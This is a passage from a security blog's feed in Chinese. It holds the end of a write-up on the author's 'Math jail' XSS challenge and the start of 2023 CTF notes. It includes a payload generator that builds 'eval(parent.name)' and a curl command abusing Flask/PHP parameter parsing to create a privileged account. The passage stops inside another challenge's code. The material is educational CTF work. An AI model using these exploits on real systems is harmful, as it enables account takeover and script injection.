punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment">// @credit: @y0d3n</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.imul'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.seeds.splice'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>      <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math.abs.name.constructor'</span><span class="token punctuation">)</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'v'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token string">'Math.LN2.valueOf'</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @credit: @Astrid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.isPrototypeOf.name.length.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.log2'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.acosh'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.random.name.valueOf'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">// @credit: @DrBrix</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'eval(parent.name)'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或許還有更短的，但我懶得找了。</p><h2><span id="總結">總結</span></h2><p>以上就是 Math jail 的解法以及思考方式。</p><p>原本最理想的狀況是可以從 Math 就找到一個能用的陣列，就不需要 <code>Math.seeds</code>，不過我試了一下似乎是沒有找到，因此才出現這個比較突兀的東西。</p><p>我自己也從其他 hacker 們的解法中學習到很多，像是清空陣列或是更短的 payload 等等，都是我當初在設計題目時也沒有想到的，大家真的都很厲害。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在 Intigriti 的每月挑戰中出了一道 XSS 的題目，被我稱之為「Math jail」，連結如下：&lt;a href=&quot;https://challenge-0823.intigriti.io/&quot;&gt;https://challenge-0823.intigriti.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而現在挑戰結束了，因此這篇文章就來講講出題的想法跟解法。 &lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 筆記</title>
    <link href="https://blog.huli.tw/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/</id>
    <published>2023-07-28T06:10:44.000Z</published>
    <updated>2023-07-29T12:29:26.684Z</updated>
    
    <content type="html"><![CDATA[<p>前陣子忙著旅遊，沒什麼時間在打 CTF，就算有打也有點懶得寫 writeup，導致上一篇 writeup 已經是 3 月份的時候了。覺得這樣斷掉其實有點可惜，就趕快再寫一篇補回來。</p><p>標題提到的這三個 CTF，我只有打 GoogleCTF 2023，其他兩場都只有稍微看一下題目而已，所以這篇也只是對題目以及解法做個筆記。</p><p>關鍵字列表：</p><ol><li>Flask 跟 PHP 解析 POST data 的順序不一致</li><li>iframe csp 阻止部分 script 載入</li><li>HEAD 繞 CSRF</li><li>location.ancestorOrigins 拿 parent origin</li><li>iframe 改 location 不會改到 src</li><li>recaptcha URL 的 Angular CSP bypass gadget</li><li>document.execCommand(‘undo’); 還原 input</li><li>X-HTTP-Method-Override</li><li>HTML 與 XHTML 的 parser 差異</li></ol><span id="more"></span><h2><span id="googlectf-2023">GoogleCTF 2023</span></h2><p>這邊有官方給的完整題目內容跟解法：<a href="https://github.com/google/google-ctf/tree/master/2023">https://github.com/google/google-ctf/tree/master/2023</a></p><h3><span id="under-construction-466-solves">UNDER-CONSTRUCTION (466 solves)</span></h3><p>這題的核心程式碼如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@authorized<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/signup'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">signup_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    raw_request <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    tier <span class="token operator">=</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tier'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tier <span class="token operator">==</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">.</span>GOLD<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'GOLD tier only allowed for the CEO'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username length must be between 4 and 15'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username address already exists'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span>         password<span class="token operator">=</span>generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tier<span class="token operator">=</span>tier<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PHP_HOST<span class="token punctuation">&#125;</span></span><span class="token string">:1337/account_migrator.php"</span></span><span class="token punctuation">,</span>         headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"token"</span><span class="token punctuation">:</span> TOKEN<span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>raw_request<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一個註冊的功能，會檢查 data 中的參數，檢查完以後把 request forward 到 PHP 那邊，而我們的目標是建議一個 tier 為 GOLD 的使用者。</p><p>解法是利用 PHP 跟 Flask 對於 POST data 解析的不一致，如果傳 <code>a=1&amp;a=2</code> 的話，Flask 在拿 a 的時候會得到 <code>1</code>（第一個），而 PHP 會拿到 <code>2</code>（最後一個）</p><p>因此只要運用這個不一致，就可以在 Flask 那邊建立一個合法的使用者，但是 forward 給 PHP 的時候 tier 變成 GOLD：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="biohazard-14-solves">BIOHAZARD (14 solves)</span></h3><p>這題的功能是可以讓你建立一個 note，而目標是 XSS。</p><p>在 render note 的時候，有一個 prototype pollution 的洞，在 render 的時候會先 sanitized：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom.safe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.unsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.HtmlSanitizer.Builder'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.string.Const'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> Const <span class="token operator">=</span> goog<span class="token punctuation">.</span>string<span class="token punctuation">.</span>Const<span class="token punctuation">;</span>  <span class="token keyword">var</span> unsafe <span class="token operator">=</span> goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>unsafe<span class="token punctuation">;</span>  <span class="token keyword">var</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>HtmlSanitizer<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowTags</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'IFRAME is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'IFRAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sanitizer <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowAttributes</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'iframe#src is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span>      <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>        <span class="token literal-property property">tagName</span><span class="token operator">:</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span>        <span class="token literal-property property">attributeName</span><span class="token operator">:</span> <span class="token string">'src'</span><span class="token punctuation">,</span>        <span class="token function-variable function">policy</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">?</span> s <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token 